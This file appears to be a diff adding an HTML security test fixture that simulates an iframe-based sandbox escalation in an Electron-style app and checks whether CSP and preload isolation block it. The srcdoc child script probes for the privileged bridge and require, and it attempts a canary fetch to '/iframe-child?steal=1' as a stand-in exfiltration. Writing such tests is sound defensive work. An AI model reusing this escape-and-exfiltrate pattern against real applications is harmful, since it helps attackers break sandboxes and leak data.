@@ -1,0 +1,60 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: child frames (iframe src + srcdoc)</title>
+<!-- ATTACK (escalation via subframes). Two vectors:
+       1. <iframe src="thing://<own-id>/index.html"> — must be blocked by
+          `frame-src 'none'`. We observe the CSP violation directly.
+       2. <iframe srcdoc="..."> — the interesting case: srcdoc inherits the
+          parent CSP rather than being fetched, and whether `frame-src` governs
+          it has been inconsistent across Chromium versions. Do not assume. If
+          the child materialises at all, it must have NO window.bridge
+          (nodeIntegrationInSubFrames:false → no preload in subframes) and NO
+          network (inherited connect-src 'none'). The child reports back via
+          postMessage; the canary is the out-of-process witness. -->
+<script>
+  const canary = ((window.bridge.getArgs() || {}).args || {}).canary || {};
+  const r = { attack: 'iframe', violations: [] };
+
+  document.addEventListener('securitypolicyviolation', (e) => {
+    r.violations.push(e.violatedDirective);
+  });
+
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.__fromChild) {
+      r.childReported = true;
+      r.childHasBridge = e.data.hasBridge;
+      r.childRequire = e.data.require;
+      r.childFetchResolved = e.data.fetchResolved;
+    }
+  });
+
+  // Vector 1: frame src to our own thing. frame-src 'none' should block it and
+  // fire a securitypolicyviolation naming the frame directive.
+  const f1 = document.createElement('iframe');
+  f1.src = 'thing://' + location.host + '/index.html';
+  document.documentElement.appendChild(f1);
+
+  // Vector 2: srcdoc child. Runs inline (script-src 'unsafe-inline' is inherited)
+  // IF frame-src permits srcdoc; probes for bridge/require and tries the canary.
+  const f2 = document.createElement('iframe');
+  const canaryHttp = JSON.stringify(canary.http || '');
+  f2.setAttribute(
+    'srcdoc',
+    '<!doctype html><script>' +
+      '(async () => {' +
+      '  const out = { __fromChild: true,' +
+      '    hasBridge: (typeof window.bridge !== "undefined"),' +
+      '    require: (typeof window.require) };' +
+      '  try { const res = await fetch(' + canaryHttp + ' + "/iframe-child?steal=1");' +
+      '    out.fetchResolved = res.ok; } catch (e) { out.fetchError = String(e); }' +
+      '  parent.postMessage(out, "*");' +
+      '})();' +
+      '<\/script>'
+  );
+  document.documentElement.appendChild(f2);
+
+  setTimeout(() => {
+    r.frameSrcViolation = r.violations.some((v) => /frame/.test(v));
+    window.bridge.emit('done', r);
+  }, 2500);
+</script>
